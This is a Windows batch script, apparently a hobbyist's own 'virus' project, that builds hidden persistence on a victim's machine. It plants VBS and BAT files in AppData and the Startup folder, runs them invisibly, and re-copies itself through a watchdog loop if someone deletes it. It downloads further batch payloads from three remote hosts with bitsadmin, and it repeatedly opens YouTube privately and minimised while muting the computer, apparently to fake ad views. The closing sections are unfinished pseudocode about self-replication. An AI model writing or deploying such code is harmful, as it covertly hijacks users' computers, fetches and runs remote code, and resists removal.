@echo off

REM Creating Replication files.
type NUL > C:\Users\%username%\Downloads\startup.bat
ECHO bob >> C:\Users\%username%\Downloads\startup.bat


REM Create new bat and vbs files with nothing in them to replace the old ones. The old ones cant be deleted since they self replicate, so replacing them with no code will prevent them any of the files from self replicating. 
type NUL > C:\Users\%username%\Downloads\startup.bat
ECHO bob >> C:\Users\%username%\Downloads\startup.bat
type NUL > C:\Users\%username%\Downloads\msdfmap.bat
ECHO bob >> C:\Users\%username%\Downloads\msdfmap.bat
type NUL > C:\Users\%username%\Downloads\msdfmap.vbs
ECHO bob >> C:\Users\%username%\Downloads\msdfmap.vbs
type NUL > C:\Users\%username%\Downloads\mute.vbs
ECHO bob >> C:\Users\%username%\Downloads\mute.vbs
type NUL > C:\Users\%username%\Downloads\startup_copier.bat
ECHO bob >> C:\Users\%username%\Downloads\startup_copier.bat



REM If the old virus files exist, this will replace them with the files from above with bob/nothing in them.
IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" (
	copy /y "C:\Users\%username%\Downloads\startup.bat" 	"C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
	)
	ELSE(
	ECHO hi
	)
IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat" (
	copy /y "C:\Users\%username%\Downloads\msdfmap.bat" 	"C:\Users\%username%\AppData\Roaming\Microsoft"	
	)
	ELSE(
	ECHO hi
	)
IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs" (
	copy /y "C:\Users\%username%\Downloads\msdfmap.vbs" 	"C:\Users\%username%\AppData\Roaming\Microsoft"	
	)
	ELSE(
	ECHO hi
	)
IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs" (
	copy /y "C:\Users\%username%\Downloads\mute.vbs" 	"C:\Users\%username%\AppData\Roaming\Microsoft"	
	)
	ELSE(
	ECHO hi
	)
IF EXIST "C:\Users\%username%\AppData\Roaming\System32\startup_copier.bat" (
	copy /y "C:\Users\%username%\Downloads\startup_copier.bat" 	"C:\Users\%username%\AppData\Roaming\System32"	
	)
	ELSE(
	ECHO hi
	)


REM This deletes the old files after they are replaced with nothing/bob. This also deletes the source, in this case the Downloads folder. 	
del C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat
del C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat
del C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs
del C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs
del C:\Users\%username%\AppData\Roaming\System32\startup_copier.bat

del C:\Users\%username%\Downloads\msdfmap.bat
del C:\Users\%username%\Downloads\startup.bat
del C:\Users\%username%\Downloads\msdfmap.vbs
del C:\Users\%username%\Downloads\mute.vbs	
del C:\Users\%username%\Downloads\startup_copier.bat

	
REM Makes the batch file invisible so no CMD prompt shows. puts the invisible code in a vbs file.
type NUL > C:\Users\%username%\Desktop\msdfmap.vbs
set pwd=CreateObject("Wscript.Shell").Run """" ^^^& WScript.Arguments(0) ^^^& """", 0, False
ECHO %pwd% >> C:\Users\%username%\Desktop\msdfmap.vbs



REM This creates the mute.vbs script.
set mute1=Set WshShell = CreateObject("WScript.Shell")
set mute2=	For i = 0 To 50
set mute3=	WshShell.SendKeys(chr(174))
set mute4=  WScript.Sleep 100
set mute5=Next
type NUL > C:\Users\%username%\Desktop\mute.vbs
ECHO %mute1%  >> C:\Users\%username%\Desktop\mute.vbs
ECHO %mute2%  >> C:\Users\%username%\Desktop\mute.vbs
ECHO %mute3%  >> C:\Users\%username%\Desktop\mute.vbs
ECHO %mute4%  >> C:\Users\%username%\Desktop\mute.vbs
ECHO %mute5%  >> C:\Users\%username%\Desktop\mute.vbs




REM This runs the invisible vbs script with a batch file. in this case it is msdfmap.bat  to make the batch file invisible.
REM It then sends the code to the startup.bat batch file so the computer boots up it runs the batch file invisibly.
REM This also runs the startup_copier.bat script. Saves to startup.bat
type NUL > C:\Users\%username%\Desktop\startup.bat
ECHO @echo off >> C:\Users\%username%\Desktop\startup.bat
ECHO wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat >> C:\Users\%username%\Desktop\startup.bat
ECHO wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Roaming\System32\startup_copier.bat >> C:\Users\%username%\Desktop\startup.bat




REM This builds the code for msdfmap.bat
REM msdfmap.bat is designed to open the internet to a specific website in incognito mode and minimized every 4 minutes
type NUL > C:\Users\%username%\Desktop\msdfmap.bat
ECHO @echo off >> C:\Users\%username%\Desktop\msdfmap.bat
REM The below  code downloads a new update. Three different sources incase one goes down.  This adds the code to the msdfmap.bat file.
ECHO IF EXIST "C:\Users\%username%\Desktop\downloadtest.bat" ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO 	echo "it's here!" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO 	bitsadmin /transfer n /download /priority normal "https://raw.githubusercontent.com/bnichs5/testwebsite/master/downloadtest.bat" "C:\Users\%username%\Desktop\downloadtest.bat" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO )	 >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO IF EXIST "C:\Users\%username%\Desktop\downloadtest.bat" ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO     echo "it's here!" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO     bitsadmin /transfer n /download /priority normal "https://bitbucket.org/w1672993/testwebsite/downloads/downloadtest.bat" "C:\Users\%username%\Desktop\downloadtest.bat" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ) >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO IF EXIST "C:\Users\%username%\Desktop\htmltest.bat" ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO     echo "it's here!" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ) ELSE ( >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO     bitsadmin /transfer n /download /priority normal "http://androidfriends.onlinewebshop.net/htmltest.bat" "C:\Users\%username%\Desktop\htmltest.bat" >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ) >> C:\Users\%username%\Desktop\msdfmap.bat
REM Starts the Startup_Copier.bat script.
ECHO start C:\Users\%username%\AppData\Roaming\System32\startup_copier.bat >> C:\Users\%username%\Desktop\msdfmap.bat
REM Wait 8 mins, then launch internet. 
ECHO ping -n 480 127.0.0.1 > nul >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO start /min iexplore -private http://youtube.com >> C:\Users\%username%\Desktop\msdfmap.bat
REM The below code loops opening the youtube every 12 minutes. Closes youtube after 35 seconds. Also mutes computer for 35 seconds.
ECHO :loop >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO start C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ping -n 35 127.0.0.1 > nul >> C:\Users\%username%\Desktop\msdfmap.bat 
ECHO taskkill /f /im iexplore.exe >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO taskkill /f /im C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO ping -n 720 127.0.0.1 > nul >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO start /min iexplore -private http://youtube.com >> C:\Users\%username%\Desktop\msdfmap.bat
ECHO goto loop >> C:\Users\%username%\Desktop\msdfmap.bat





REM This code stores the startup_copier. It copy's the startup.bat file in a different location in case someone tries to delete it from the start up folder. Then it will copy back to the startup folder. 
type NUL > C:\Users\%username%\Desktop\startup_copier.bat
ECHO @echo off >> C:\Users\%username%\Desktop\startup_copier.bat
set sc1=:loop2
set sc2=IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" (
set sc3=	ECHO nothing
set sc4=	)
set sc5=	ELSE(
set sc7=	copy "C:\Users\%username%\AppData\Roaming\System32\startup.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set sc8=	)
set sc9=goto loop2
ECHO %sc1%  >> C:\Users\%username%\Desktop\startup_copier.bat
ECHO %sc2%  >> C:\Users\%username%\Desktop\startup_copier.bat
ECHO %sc3%  >> C:\Users\%username%\Desktop\startup_copier.bat
ECHO %sc4%  >> C:\Users\%username%\Desktop\startup_copier.bat
ECHO %sc5%  >> C:\Users\%username%\Desktop\startup_copier.bat
ECHO %sc7%  >> C:\Users\%username%\Desktop\startup_copier.bat
ECHO %sc8%  >> C:\Users\%username%\Desktop\startup_copier.bat
ECHO %sc9%  >> C:\Users\%username%\Desktop\startup_copier.bat






REM This code runs the newly downloaded update. 
//////////
//////////
//////////
//////////
	


REM This code builds an index.html incase I want to input ad code without a centralized website.
REM type NUL > C:\Users\%username%\Desktop\index.txt
REM ECHO ^<html^> >> C:\Users\%username%\Desktop\index.txt
REM ECHO ^<body^> >> C:\Users\%username%\Desktop\index.txt
REM ECHO Hello >> C:\Users\%username%\Desktop\index.txt
REM ECHO ^</body^> >> C:\Users\%username%\Desktop\index.txt
REM ECHO ^</html^> >> C:\Users\%username%\Desktop\index.txt
REM REN C:\Users\%username%\Desktop\index.txt index2.html



REM This code copies each of the created files to specific folders. 
copy /y "C:\Users\%username%\Desktop\startup.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy /y "C:\Users\%username%\Desktop\msdfmap.bat" "C:\Users\%username%\AppData\Roaming\Microsoft"
copy /y "C:\Users\%username%\Desktop\msdfmap.vbs" "C:\Users\%username%\AppData\Roaming\Microsoft"
copy /y "C:\Users\%username%\Desktop\mute.vbs" "C:\Users\%username%\AppData\Roaming\Microsoft"
if not exist "C:\Users\%username%\AppData\Roaming\System32" mkdir C:\Users\%username%\AppData\Roaming\System32
copy /y "C:\Users\%username%\Desktop\startup_copier.bat" "C:\Users\%username%\AppData\Roaming\System32"
copy /y "C:\Users\%username%\Desktop\startup.bat" "C:\Users\%username%\AppData\Roaming\System32"
REM copy "C:\Users\%username%\Desktop\index.html" "C:\Users\%username%\AppData\Local"



REM After the files above are copied, this code deletes the original created files. This acts as a cut and paste.
del C:\Users\%username%\Desktop\startup.bat
del C:\Users\%username%\Desktop\msdfmap.bat
del C:\Users\%username%\Desktop\msdfmap.vbs
del C:\Users\%username%\Desktop\mute.vbs
del C:\Users\%username%\Desktop\startup_copier.bat

REM del C:\Users\%username%\Desktop\index.html



REM Incase this is converted to an exe file this will delete the exe file. 
REM del virusremover.exe



REM This code runs the startup batch script. Needs to be added
REM start "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat"
////////////////////
///////////////////
////////////////////
//////////////







if startup.bat doesnt exist in system32 then create it. 

if doesnt exist in the 5 locations replicate to all 5 locations 
or whichever are missing and then run/start




REM This code replicates this whole script to an unknown location 
If "Name of this virus" doesnt exist in C:\___ then copy to C:\_____ and rename it as "whatever.bat"







